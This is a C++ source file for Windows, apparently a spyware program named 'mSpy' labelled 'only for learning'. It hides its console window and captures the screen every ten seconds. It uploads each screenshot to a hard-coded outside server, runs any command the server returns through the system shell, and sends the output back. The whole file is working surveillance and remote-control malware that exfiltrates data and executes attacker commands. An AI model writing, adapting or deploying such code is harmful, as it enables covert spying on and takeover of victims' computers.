
/************************************************** Description *******************************************************/
/*
    File : main.cpp
    Programmer : Mohammad Lotfi
    Used : main
    Design Pattern : none
    Types of memory : Heap & Stack
    Total Tread : Nothing
    Site : https://www.mahsen.ir
    Tel : +989124662703
    Email : info@mahsen.ir
    Last Update : 2025/2/15
*/
/************************************************** Warnings **********************************************************/
/*
    Only for learning
*/
/************************************************** Wizards ***********************************************************/
/*
    Nothing
*/
/************************************************** Includes **********************************************************/
#include <Windows.h>
#include <gdiplus.h>
#include <wininet.h>
#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <thread>
#include <stdio.h>
#include <iostream>
#include <string>
#include <array>
#include <memory>
#include <cstdlib>
/************************************************** Defineds **********************************************************/
/*
    Nothing
*/
/************************************************** Names *************************************************************/
using namespace std;
/************************************************** Variables *********************************************************/
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "wininet.lib")
/*--------------------------------------------------------------------------------------------------------------------*/
const char* Server = "mahsen.ir"; // Change this to your Server
const char* Core = "/APP/mSpy/do.php";
string MAIN_ImageName = "noName.jpg";
string MAIN_RespondName = "noName.txt";
string MAIN_Request = "noRquest";
/************************************************** Opjects ***********************************************************/
/*
    Nothing
*/
/************************************************** Functions *********************************************************/
// Function to get the CLSID of the encoder
int MAIN_GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;          // Number of image encoders
    UINT size = 0;         // Size of the encoder array
    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    // Get the image codec info
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;

    // Get the list of encoders
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

    // Find the encoder for the specified format
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j; // Success
        }
    }

    free(pImageCodecInfo);
    return -1; // Failure
}
/*--------------------------------------------------------------------------------------------------------------------*/
// Function to take a screenshot and save it as JPEG
bool MAIN_captureScreenshot(const string& filename) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, screenWidth, screenHeight);
    SelectObject(hDC, hBitmap);

    BitBlt(hDC, 0, 0, screenWidth, screenHeight, hScreen, 0, 0, SRCCOPY);

    // Initialize GDI+ and create image from HBITMAP
    Gdiplus::Bitmap bitmap(hBitmap, NULL);

    // Get the encoder CLSID for JPEG format
    CLSID clsid;
    MAIN_GetEncoderClsid(L"image/jpeg", &clsid);

    // Save image to file in JPEG format
    bitmap.Save(std::wstring(filename.begin(), filename.end()).c_str(), &clsid, NULL);

    // Clean up GDI objects
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);

    return true;
}
/*--------------------------------------------------------------------------------------------------------------------*/
// Function to upload
bool MAIN_uploadFile(const string& filename) {

    // Open internet session
    HINTERNET hInternet = InternetOpen("Uploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    // Open connection to the Server
    HINTERNET hConnect = InternetConnect(hInternet, Server, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    // Prepare the HTTP request
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", Core, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Read the file content
    ifstream file(filename, ios::binary | ios::ate);
    if (!file) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    streamsize fileSize = file.tellg();
    file.seekg(0, ios::beg);
    char* buffer = new char[fileSize];
    file.read(buffer, fileSize);
    file.close();

    // Create boundary for multipart/form-data
    string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    string contentType = "multipart/form-data; boundary=" + boundary;

    // Prepare multipart body
    string body = "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";

    // Append file content
    body.append(buffer, fileSize);

    // Prepare end boundary
    body += "\r\n--" + boundary + "--\r\n";

    // Set headers
    string headers = "Content-Type: " + contentType + "\r\n";

    // Cast body.length() to DWORD to avoid type mismatch
    DWORD bodyLength = static_cast<DWORD>(body.length());

    // Send the request with the headers and body together
    if (!HttpSendRequestA(hRequest, headers.c_str(), static_cast<DWORD>(headers.length()), (PVOID)body.c_str(), bodyLength)) {
        std::cout << "HttpSendRequest failed! Error: " << GetLastError() << std::endl;
        delete[] buffer;
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Read the server's response (i.e., the echo from PHP)
    DWORD bytesRead = 0;
    char response[4096];  // Buffer to store the server response
    MAIN_Request = "";
    
    while (InternetReadFile(hRequest, response, sizeof(response) - 1, &bytesRead) && bytesRead > 0) {
        response[bytesRead] = '\0'; // Null-terminate the response
        MAIN_Request += string(response); // Append the response to the string
    }

    delete[] buffer;
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return true;
}
/*--------------------------------------------------------------------------------------------------------------------*/
char* MAIN_GetComputerName () {
    static char buffer[256] = "";
    try {
        DWORD size = sizeof(buffer);
        GetComputerName(buffer, &size);
        buffer[size] = 0;
    }
    catch(...) {
        strcpy(buffer, "noName");
    }
    return buffer;
}
/*--------------------------------------------------------------------------------------------------------------------*/
string MAIN_exeCommand(const std::string& command) {
    std::string fullCommand = command + " > " + MAIN_RespondName; // Redirect output to file
    system(fullCommand.c_str()); // Execute command

    // Read output from file
    std::ifstream file(MAIN_RespondName);
    std::string result, line;
    while (std::getline(file, line)) {
        result += line + "\n";
    }
    file.close();
    
    return result;
}
/*--------------------------------------------------------------------------------------------------------------------*/
/* The main function start of program in cpp language */
int main() {
    
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);  // Hide console

    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiStartupInput;
    ULONG_PTR gdiplusToken;

    MAIN_ImageName = string(MAIN_GetComputerName()) + ".jpg";
    MAIN_RespondName = string(MAIN_GetComputerName()) + ".txt";

    while (true) {
        
        Gdiplus::GdiplusStartup(&gdiplusToken, &gdiStartupInput, NULL);

        // Capture and save screenshot
        if (MAIN_captureScreenshot(MAIN_ImageName)) {
            cout << "Screenshot saved: " << MAIN_ImageName << endl;
        } else {
            cout << "Screenshot failed!" << endl;
        }

        // Upload the file
        if (MAIN_uploadFile(MAIN_ImageName)) {
            cout << "Image File uploaded successfully!" << endl;
            if(MAIN_Request != "") {
                string Respond = MAIN_exeCommand(MAIN_Request);
                cout << "Command Request:\n" << MAIN_Request << endl;
                cout << "Command Respond:\n" << Respond << endl;
                if (MAIN_uploadFile(MAIN_RespondName)) {
                    cout << "Respond File uploaded successfully!" << endl;
                } else {
                    cout << "Respond Failed to upload file!" << endl;
                }
            }
        } else {
            cout << "Image Failed to upload file!" << endl;
        }

        // Shutdown GDI+
        Gdiplus::GdiplusShutdown(gdiplusToken);

        Sleep(10000);
    }

    return 0;
}
/************************************************** Tasks *************************************************************/
/*
    Nothing
*/
/************************************************** Vectors ***********************************************************/
/*
    Nothing
*/
/**********************************************************************************************************************/
